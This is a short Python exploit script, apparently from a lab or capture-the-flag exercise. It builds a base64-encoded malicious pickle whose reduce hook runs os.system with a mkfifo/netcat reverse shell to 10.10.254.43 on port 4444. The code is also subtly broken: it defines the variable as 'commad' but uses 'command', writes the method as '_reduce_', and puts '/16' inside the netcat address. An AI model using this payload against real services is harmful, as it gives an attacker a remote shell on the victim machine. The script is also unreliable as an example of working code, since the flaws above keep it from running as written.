import pickle 
import sys 
import base64

commad = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat 10.10.254.43/16 4444 > /tmp/f'

class rce(object):
    def _reduce_(self):
        import os
        return (os.system,(command))

print(base64.b64encode(pickle.dumps(rce())))
